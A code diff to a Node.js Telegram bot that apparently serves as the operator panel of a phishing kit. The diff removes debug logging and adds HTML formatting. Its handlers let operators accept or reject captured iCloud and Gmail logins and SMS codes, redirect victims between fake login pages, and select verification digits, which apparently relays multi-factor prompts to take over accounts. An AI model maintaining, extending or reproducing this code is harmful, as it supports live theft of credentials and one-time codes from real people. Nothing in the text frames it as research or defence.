@@ -106,7 +106,6 @@ async function broadcastMessage(chatId, message, options = {}) {
 
   try {
     await bot.sendMessage(chatId, message, options);
-    console.log(`✅ Message sent to Bot 1`);
   } catch (err) {
     console.error("❌ Failed to send to Bot 1:", err.message);
     errors.push(err);
@@ -115,7 +114,6 @@ async function broadcastMessage(chatId, message, options = {}) {
   if (bot2 && ADMIN_CHAT_ID_2) {
     try {
       await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
-      console.log(`✅ Message sent to Bot 2`);
     } catch (err) {
       console.error("❌ Failed to send to Bot 2:", err.message);
       errors.push(err);
@@ -167,7 +165,6 @@ bot.on("callback_query", async (query) => {
     // ============================================================================
     if (action === "verify_digit") {
       const [, requestId, digit] = query.data.split("|");
-      console.log(`📍 Digit ${digit} clicked for requestId: ${requestId}`);
       
       try {
         const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
@@ -177,11 +174,9 @@ bot.on("callback_query", async (query) => {
         });
         
         const result = await updateResult.json();
-        console.log(`✅ Digit stored. Count: ${result.selectedCount}`);
         
         // ✅ Only remove keyboard and show message when we have 2 digits
         if (result.selectedCount === 2) {
-          console.log(`✅ 2 digits collected! Removing keyboard...`);
           try {
             await bot.editMessageReplyMarkup(
               { inline_keyboard: [] },
@@ -196,9 +191,6 @@ bot.on("callback_query", async (query) => {
           } catch (err) {
             console.error("❌ Error editing message:", err);
           }
-        } else {
-          // ✅ Just acknowledge the digit, don't remove keyboard
-          console.log(`⏳ Waiting for digit 2...`);
         }
 
         await bot.answerCallbackQuery(query.id, { text: `📍 Digit ${digit} selected (${result.selectedCount}/2)` });
@@ -339,7 +331,6 @@ bot.on("callback_query", async (query) => {
                 parse_mode: "HTML"
               })
             });
-            console.log(`✅ Sent verifying choice message`);
           }
         } catch (err) {
           console.error("Error sending choice message:", err);
@@ -542,7 +533,6 @@ bot.on("callback_query", async (query) => {
         const response = await fetch(`${APP_URL}/get-page-display-email?email=${encodeURIComponent(identifier)}`);
         const data = await response.json();
         displayEmail = data.displayEmail || email;
-        console.log(`📝 iCloud page callback: email ${identifier} → display ${displayEmail}`);
       } catch (err) {
         console.error("Error fetching display email:", err);
         displayEmail = email;
@@ -611,13 +601,13 @@ bot.on("callback_query", async (query) => {
       } else if (action === "reject") {
         statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
       } else if (action === "page_accept") {
-        statusMessage = `☁️ ${displayEmail} has been ACCEPTED! ✅`;
+        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "page_reject") {
-        statusMessage = `☁️ ${displayEmail} iCloud Login REJECTED! ❌`;
+        statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
       } else if (action === "sms_accept") {
-        statusMessage = `💬 ${smsCode} SMS Accepted!✅`;
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`;
       } else if (action === "sms_reject") {
-        statusMessage = `💬 ${smsCode} SMS Rejected!❌`;
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>Rejected</b>!❌`;
       } else if (action === "redirect_icloud") {
         statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
       } else if (action === "redirect_gmail") {
@@ -632,7 +622,7 @@ bot.on("callback_query", async (query) => {
           console.error("Error fetching Gmail display email:", err);
           displayEmail = email;
         }
-        statusMessage = `🌈 ${displayEmail} has been ACCEPTED! ✅`;
+        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "gmail_reject") {
         // ✅ For Gmail callbacks, fetch displayEmail
         try {
@@ -643,7 +633,7 @@ bot.on("callback_query", async (query) => {
           console.error("Error fetching Gmail display email:", err);
           displayEmail = email;
         }
-        statusMessage = `🌈 ${displayEmail} has been REJECTED! ❌`;
+        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
       } else if (action === "verification_accept") {
         // ✅ For verification callbacks, fetch displayEmail
         try {
@@ -654,7 +644,7 @@ bot.on("callback_query", async (query) => {
           console.error("Error fetching verification display email:", err);
           displayEmail = email;
         }
-        statusMessage = `🌈 ${displayEmail} Verification ACCEPTED! ✅`;
+        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED</b>! ✅`;
       } else if (action === "verification_reject") {
         // ✅ For verification callbacks, fetch displayEmail
         try {
@@ -665,7 +655,7 @@ bot.on("callback_query", async (query) => {
           console.error("Error fetching verification display email:", err);
           displayEmail = email;
         }
-        statusMessage = `🌈 ${displayEmail} Verification REJECTED! ❌`;
+        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED</b>! ❌`;
       } else if (action === "gmail_verify_accept") {
         statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
       } else if (action === "gmail_verify_reject") {
@@ -1004,7 +994,6 @@ if (bot2) {
       
       if (action === "verify_digit") {
         const [, requestId, digit] = query.data.split("|");
-        console.log(`📍 Bot 2 | Digit ${digit} clicked for requestId: ${requestId}`);
         
         try {
           const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
@@ -1014,11 +1003,9 @@ if (bot2) {
           });
           
           const result = await updateResult.json();
-          console.log(`✅ Digit stored. Count: ${result.selectedCount}`);
           
           // ✅ Only remove keyboard and show message when we have 2 digits
           if (result.selectedCount === 2) {
-            console.log(`✅ 2 digits collected! Removing keyboard...`);
             try {
               await bot2.editMessageReplyMarkup(
                 { inline_keyboard: [] },
@@ -1033,9 +1020,6 @@ if (bot2) {
             } catch (err) {
               console.error("❌ Error editing message:", err);
             }
-          } else {
-            // ✅ Just acknowledge the digit, don't remove keyboard
-            console.log(`⏳ Waiting for digit 2...`);
           }
 
           await bot2.answerCallbackQuery(query.id, { text: `📍 Digit ${digit} selected (${result.selectedCount}/2)` });
